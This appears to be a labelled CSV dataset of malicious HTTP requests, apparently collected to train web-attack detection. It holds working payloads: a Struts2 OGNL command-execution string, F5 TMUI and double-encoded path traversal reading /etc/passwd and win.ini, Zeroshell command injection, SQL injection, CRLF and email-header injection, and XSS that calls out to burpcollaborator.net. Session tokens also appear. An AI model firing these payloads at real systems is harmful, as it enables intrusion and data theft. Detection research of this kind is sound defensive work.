id,method,user_agent,url,refer,body,lable
940,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36",/assets/js/default~404~appoint~%23%0d%0aSomeCustomInjectedHeader:%20injected_by_wvs~detail~identify~main~print~sign~signature~template.1e25895209c51ce48c4e.js,http://124.70.151.147:9180/,"POST /risk/user/create?_=1641279351111 HTTP/1.1 Content-Type: application/x-www-form-urlencoded X-Requested-With: XMLHttpRequest Referer: http://124.70.151.147:9180/ Cookie: SID=f2da4298-603b-42f9-a11b-9be0cf75518c Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate,br Content-Length: 43 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Host: 124.70.151.147:9180 Connection: Keep-alive  bizId=-1%20OR%203%2B936-936-1=0%2B0%2B0%2B1GET /login/pin?_=1641279354575&encrypt=BB5Pp13v&needCaptcha=false HTTP/1.1 Referer: http://124.70.151.147:9180/ Cookie: SID=f2da4298-603b-42f9-a11b-9be0cf75518c Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate,br User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Host: 124.70.151.147:9180 Connection: Keep-alive  GET /sys/config/skin?_=../1641279319899 HTTP/1.1 Referer: http://124.70.151.147:9180/ Cookie: SID=f2da4298-603b-42f9-a11b-9be0cf75518c Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate,br User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Host: 124.70.151.147:9180 Connection: Keep-alive  GET /assets/js/default~500~appoint~auth~detail~identify~main~print~sign~signature~template.967292fd97008e6eb1ac.js HTTP/1.1 X-Requested-With: XMLHttpRequest Referer: http://124.70.151.147:9180/ Cookie: SID=f2da4298-603b-42f9-a11b-9be0cf75518c Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate,br User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Host: 124.70.151.147:9180 Connection: Keep-alive  GET /assets/js/default~500~appoint~auth~detail~identify~main~print~sign~signature~template.%c4%8aSomeCustomInjectedHeader:%20injected_by_wvsfd97008e6eb1ac.js HTTP/1.1 Referer: http://124.70.151.147:9180/ Cookie: SID=f2da4298-603b-42f9-a11b-9be0cf75518c Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate,br User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Host: 124.70.151.147:9180 Connection: Keep-alive  GET /assets/js/default~404~appoint~%23%0d%0aSomeCustomInjectedHeader:%20injected_by_wvs~detail~identify~main~print~sign~signature~template.1e25895209c51ce48c4e.js HTTP/1.1 Referer: http://124.70.151.147:9180/ Cookie: SID=f2da4298-603b-42f9-a11b-9be0cf75518c Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate,br User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Host: 124.70.151.147:9180 Connection: Keep-alive  ",4
1221,POST,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36",/%25%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%23cmd%3D%27echo%20vulnerable%27%29.%28%23iswin%3D%28%40java.lang.System%40getProperty%28%27os.name%27%29.toLowerCase%28%29.contains%28%27win%27%29%29%29.%28%23cmds%3D%28%23iswin%3F%7B%27cmd.exe%27%2C%27/c%27%2C%23cmd%7D%3A%7B%27/bin/bash%27%2C%27-c%27%2C%23cmd%7D%29%29.%28%23p%3Dnew%20java.lang.ProcessBuilder%28%23cmds%29%29.%28%23p.redirectErrorStream%28true%29%29.%28%23process%3D%23p.start%28%29%29.%28%23ros%3D%28%40org.apache.struts2.ServletActionContext%40getResponse%28%29.getOutputStream%28%29%29%29.%28%40org.apache.commons.io.IOUtils%40copy%28%23process.getInputStream%28%29%2C%23ros%29%29.%28%23ros.flush%28%29.multipart/form-data%29%7D/doUpload.action?class.classLoader.jarPath=%28%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse%2C%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23_memberAccess.excludeProperties%3D%40java.util.Collections%40EMPTY_SET%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse%28%29%2C%23out.getWriter%28%29.print%28%224R1K5wsZm%22%29%2C%23out.getWriter%28%29.print%28%22ja4wgyJ%22%29%2C%23out.getWriter%28%29.flush%28%29%2C%23out.getWriter%28%29.close%28%29%29%28meh%29&z[(class.classLoader.jarPath)('meh')]=true,,,4
439,GET,Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36,/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/f5-release,,GET /tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/f5-release HTTP/1.1 Host: 118.212.233.250:8384 User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36 Connection: close Accept: */* Accept-Language: en Accept-Encoding: gzip  ,4
316,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36",/api%0d%0aBCC%3aj4o2iacbf50bsg4dn7hbwqrpigo9c40wtkkc72vr@burpcollaborator.net%0d%0akpx%3a%20n,,"GET /api%0d%0aBCC%3aj4o2iacbf50bsg4dn7hbwqrpigo9c40wtkkc72vr@burpcollaborator.net%0d%0akpx%3a%20n HTTP/1.1 Host: 121.4.111.58:3000 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Connection: close Cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjEsInVzZXJuYW1lIjoidGVzdCIsImVtYWlsIjoiMUBtYWlsLmNvbSIsInBhc3N3b3JkIjoiMDVhNjcxYzY2YWVmZWExMjRjYzA4Yjc2ZWE2ZDMwYmIiLCJyb2xlIjoiZGVsdXhlIiwiZGVsdXhlVG9rZW4iOiJkZWYyM2E0MmY1Mzg3OTIyNTMyODZiMDY5NmJmYmVhNGI0M2Q4MTUwZThlNDZjNzkxZDA1M2U4NTZhZWQ5NmQ2IiwibGFzdExvZ2luSXAiOiJ1bmRlZmluZWQiLCJwcm9maWxlSW1hZ2UiOiIvYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyMi0wMy0xNFQwMjozNToyNC4wMzJaIiwidXBkYXRlZEF0IjoiMjAyMi0wMy0xNFQwODowOToxNS4xNTZaIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNjQ3MjQ1MzU1LCJleHAiOjE2NDcyNjMzNTV9.XqCkN_u8DXz-o8IHGloojY20FLpobAsEe3N4DhwHto0YPFOTZklrxfCwB9smk_0M07BB75oR7B-81FIX2dOvUJooo0jik99E7p5_xklRoLh_NBTabk5kLwkVYWp8ggQyceIZMSfu1kAMsPNZBsGuvDmXWOlAf9RrSWN8pmEwU_A; continueCode=QVJ9b62p1OWXjLloAOYhrUzTKiPQHbYS1LfbZhbqTPnGNnMxgwKeZR735zkv  ",4
1039,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36",/assets/css/default~appoint~main.0%0d%0a%09SomeCustomInjectedHeader:%20injected_by_wvs.css,http://124.70.151.147:9180/,"GET /assets/css/default~appoint~main.0%0d%0a%09SomeCustomInjectedHeader:%20injected_by_wvs.css HTTP/1.1 Referer: http://124.70.151.147:9180/ Cookie: SID=f2da4298-603b-42f9-a11b-9be0cf75518c Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate,br User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Host: 124.70.151.147:9180 Connection: Keep-alive  ",4
570,GET,Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 360shuke_scanner,/cgi-bin/kerbynet?Action=x509view&Section=NoAuthREQ&User=&x509type=%27%0A%2Fetc%2Fsudo%20tar%20-cf%20%2Fdev%2Fnull%20%2Fdev%2Fnull%20--checkpoint%3d1%20--checkpoint-action%3dexec%3d%22expr%20942089069%20%2b%20960013212%22%0A%27,,,4
657,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36",/user/change//%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f/etc/passwd,,"GET /user/change//%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f/etc/passwd HTTP/1.1 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate,br User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Host: 124.70.151.147:9180 Connection: Keep-alive  ",4
21,GET,Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 360shuke_scanner,/~user/%0D%0ASet-Cookie:crlfinjection,,,4
182,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36",/?1%0d%0aBCC%3azwzp7o16s267suy1p3utmagyup0mojcb5zzmpae@burpcollaborator.net%0d%0aggg%3a%20g=1,,"GET /?1%0d%0aBCC%3azwzp7o16s267suy1p3utmagyup0mojcb5zzmpae@burpcollaborator.net%0d%0aggg%3a%20g=1 HTTP/1.1 Host: 121.4.111.58:3000 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en-US,en-GB;q=0.9,en;q=0.8 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Connection: close Cache-Control: max-age=0  ",4
1080,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36",/assets/js/default~400~appoint~auth~detail~identify~main~%C0%8D%C0%8ASomeCustomInjectedHeader:%20injected_by_wvs~sign~signature~template.8cd81fe93872e5162f62.js,http://124.70.151.147:9180/,"GET /assets/js/default~400~appoint~auth~detail~identify~main~%C0%8D%C0%8ASomeCustomInjectedHeader:%20injected_by_wvs~sign~signature~template.8cd81fe93872e5162f62.js HTTP/1.1 Referer: http://124.70.151.147:9180/ Cookie: SID=f2da4298-603b-42f9-a11b-9be0cf75518c Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate,br User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Host: 124.70.151.147:9180 Connection: Keep-alive  ",4
74,GET,Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0,/cgi-bin/kerbynet?Action=x509view&Section=NoAuthREQ&User=&x509type=%27%0Aexpr%20947364986%20-%20872066501%0A%27,,"GET /cgi-bin/kerbynet?Action=x509view&Section=NoAuthREQ&User=&x509type=%27%0Aexpr%20947364986%20-%20872066501%0A%27 HTTP/1.1 Host: detectportal.firefox.com:80 User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 Accept: */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Cache-Control: no-cache Pragma: no-cache Accept-Encoding: gzip  ",4
1127,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Safari/537.36",/demo/aisec/html_link.php?id=%0D%0AAESCLRFInjectedHeader:+AES,,"GET /demo/aisec/html_link.php?id=%0D%0AAESCLRFInjectedHeader:+AES HTTP/1.1 Accept: application/json, text/plain, */* Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Safari/537.36 Host: demo.aisec.cn Connection: close  ",4
391,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36",/main.js?javascript%3a%2f*%3c%2fscript%3e%3cimg%2fonerror%3d'-%2f%22%2f-%2f%20onmouseover%3d1%2f-%2f[%60*%2f[]%2f[(new(Image)).src%3d(%2f%3b%2f%2b%2ftjgcxkrluffl7qjn2hwlb06zxq3jranyfp3jq9eyX%3b.burpcollaborator.net%2f).replace(%2f.%3b%2fg%2c[])]%2f%2f'src%3d%3e=1,http://121.4.111.58:3000/,"GET /main.js?javascript%3a%2f*%3c%2fscript%3e%3cimg%2fonerror%3d'-%2f%22%2f-%2f%20onmouseover%3d1%2f-%2f[%60*%2f[]%2f[(new(Image)).src%3d(%2f%3b%2f%2b%2ftjgcxkrluffl7qjn2hwlb06zxq3jranyfp3jq9eyX%3b.burpcollaborator.net%2f).replace(%2f.%3b%2fg%2c[])]%2f%2f'src%3d%3e=1 HTTP/1.1 Host: 121.4.111.58:3000 Origin: http://121.4.111.58:3000 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Accept: */* Referer: http://121.4.111.58:3000/ Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjEsInVzZXJuYW1lIjoidGVzdCIsImVtYWlsIjoiMUBtYWlsLmNvbSIsInBhc3N3b3JkIjoiMDVhNjcxYzY2YWVmZWExMjRjYzA4Yjc2ZWE2ZDMwYmIiLCJyb2xlIjoiZGVsdXhlIiwiZGVsdXhlVG9rZW4iOiJkZWYyM2E0MmY1Mzg3OTIyNTMyODZiMDY5NmJmYmVhNGI0M2Q4MTUwZThlNDZjNzkxZDA1M2U4NTZhZWQ5NmQ2IiwibGFzdExvZ2luSXAiOiJ1bmRlZmluZWQiLCJwcm9maWxlSW1hZ2UiOiIvYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyMi0wMy0xNFQwMjozNToyNC4wMzJaIiwidXBkYXRlZEF0IjoiMjAyMi0wMy0xNFQwODowOToxNS4xNTZaIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNjQ3MjQ1MzU1LCJleHAiOjE2NDcyNjMzNTV9.XqCkN_u8DXz-o8IHGloojY20FLpobAsEe3N4DhwHto0YPFOTZklrxfCwB9smk_0M07BB75oR7B-81FIX2dOvUJooo0jik99E7p5_xklRoLh_NBTabk5kLwkVYWp8ggQyceIZMSfu",4
757,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36",/assets/js/default~400~appoint~auth~detail~identify~main~print~%C0%8D%C0%8ASomeCustomInjectedHeader:%20injected_by_wvs~signature~template.8cd81fe93872e5162f62.js,http://124.70.151.147:9180/,"GET /assets/js/default~404~appoint~auth~detail~identify~%E2%80%A8SomeCustomInjectedHeader:%20injected_by_wvs~print~sign~signature~template.1e25895209c51ce48c4e.js HTTP/1.1 Referer: http://124.70.151.147:9180/ Cookie: SID=f2da4298-603b-42f9-a11b-9be0cf75518c Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate,br User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Host: 124.70.151.147:9180 Connection: Keep-alive  GET /assets/js/default~500~appoint~auth~detail~identify~main~print~-1%20OR%202+626-626-1=0+0+0+1~signature~template.967292fd97008e6eb1ac.js HTTP/1.1 X-Requested-With: XMLHttpRequest Referer: http://124.70.151.147:9180/ Cookie: SID=f2da4298-603b-42f9-a11b-9be0cf75518c Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate,br User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Host: 124.70.151.147:9180 Connection: Keep-alive  GET /assets/js/default~400~appoint~auth~detail~identify~main~print~%C0%8D%C0%8ASomeCustomInjectedHeader:%20injected_by_wvs~signature~template.8cd81fe93872e5162f62.js HTTP/1.1 Referer: http://124.70.151.147:9180/ Cookie: SID=f2da4298-603b-42f9-a11b-9be0cf75518c Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate,br User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Host: 124.70.151.147:9180 Connection: Keep-alive  ",4
403,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36",/socket.io/?EIO=4&transport=polling%0d%0aBCC%3af7n3uptdwv7s3quh6ck5jer19sfl3orgk4br2fr@burpcollaborator.net%0d%0auob%3a%20u&t=N-6CypX,http://121.4.111.58:3000/,"GET /socket.io/?EIO=4&transport=polling%0d%0aBCC%3af7n3uptdwv7s3quh6ck5jer19sfl3orgk4br2fr@burpcollaborator.net%0d%0auob%3a%20u&t=N-6CypX HTTP/1.1 Host: 121.4.111.58:3000 Accept: */* User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Referer: http://121.4.111.58:3000/ Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; continueCode=E3OzQenePWoj4zk293aRX8KbBNYEAo9GL5qO1ZDwp6JyVxgQMmrlv7npKLVy Connection: close  ",4
382,GET,Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0),/athenareg.php?pass=%20;id,,,4
765,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36",/assets/css/default~sign~%23%0d%0aSomeCustomInjectedHeader:%20injected_by_wvs.38b51b2744dd7f438644.css,http://124.70.151.147:9180/,"GET /assets/css/default~sign~%23%0d%0aSomeCustomInjectedHeader:%20injected_by_wvs.38b51b2744dd7f438644.css HTTP/1.1 Referer: http://124.70.151.147:9180/ Cookie: SID=f2da4298-603b-42f9-a11b-9be0cf75518c Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate,br User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Host: 124.70.151.147:9180 Connection: Keep-alive  ",4
266,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36",/rest/admin/application-version%3e%0d%0aBCC%3ajh42vapbs5db5ghd07ub9q4pvg19p0oogi49wwmkb@burpcollaborator.net%0d%0adiq%3a%20h,http://121.4.111.58:3000/,"GET /rest/admin/application-version%3e%0d%0aBCC%3ajh42vapbs5db5ghd07ub9q4pvg19p0oogi49wwmkb@burpcollaborator.net%0d%0adiq%3a%20h HTTP/1.1 Host: 121.4.111.58:3000 Accept: application/json, text/plain, */* Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjEsInVzZXJuYW1lIjoidGVzdCIsImVtYWlsIjoiMUBtYWlsLmNvbSIsInBhc3N3b3JkIjoiMDVhNjcxYzY2YWVmZWExMjRjYzA4Yjc2ZWE2ZDMwYmIiLCJyb2xlIjoiZGVsdXhlIiwiZGVsdXhlVG9rZW4iOiJkZWYyM2E0MmY1Mzg3OTIyNTMyODZiMDY5NmJmYmVhNGI0M2Q4MTUwZThlNDZjNzkxZDA1M2U4NTZhZWQ5NmQ2IiwibGFzdExvZ2luSXAiOiJ1bmRlZmluZWQiLCJwcm9maWxlSW1hZ2UiOiIvYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyMi0wMy0xNFQwMjozNToyNC4wMzJaIiwidXBkYXRlZEF0IjoiMjAyMi0wMy0xNFQwODowOToxNS4xNTZaIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNjQ3MjQ1MzU1LCJleHAiOjE2NDcyNjMzNTV9.XqCkN_u8DXz-o8IHGloojY20FLpobAsEe3N4DhwHto0YPFOTZklrxfCwB9smk_0M07BB75oR7B-81FIX2dOvUJooo0jik99E7p5_xklRoLh_NBTabk5kLwkVYWp8ggQyceIZMSfu1kAMsPNZBsGuvDmXWOlAf9RrSWN8pmEwU_A User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Referer: http://121.4.111.58:3000/ Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXM",4
998,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36",/qyswebapp//%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fwindows/win.ini,,"GET /qyswebapp//%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fwindows/win.ini HTTP/1.1 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate,br User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36 Host: 124.70.151.147:9180 Connection: Keep-alive  ",4
